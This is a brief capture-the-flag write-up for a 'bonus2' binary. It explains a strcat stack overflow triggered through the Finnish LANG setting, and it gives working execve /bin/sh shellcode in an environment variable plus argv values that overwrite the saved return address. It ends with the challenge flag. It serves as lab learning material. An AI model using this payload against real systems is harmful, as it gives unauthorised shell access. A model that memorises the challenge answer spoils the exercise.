This program just say "Hello" with your name on argv[1] and argv[2]. It prints "Hello" according to the variable "LANG" in the environment (just for "en", "nl" and "fi"). The main function set the language and retrieve the name of the user, the function greetuser copy "Hello" according to "LANG" and print "Hello name". 
We can exploit a buffer overflow by rewriting old EIP of greetuser when it uses strcat in greetuser. Indeed, the function have a buffer (0x40) to store "Hello" (according to "LANG") and concat it with the name. We can't rewrite old EIP if we use english language but it's possible with "fi" language ("Hello" is "Hyvää päivää "). We set our shellcode in the environment to replace old EIP and we can get a shell with this payload for example:

export SHELLCODE=`python -c 'print ("\x90" * 0xffff + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80")'`

./bonus2 `python -c 'print (0x28 * "a")'` `python -c 'print (0x12 * "b" + "\xff\xff\xfe\xbf\x00")'`

Yaiii, the flag is 71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
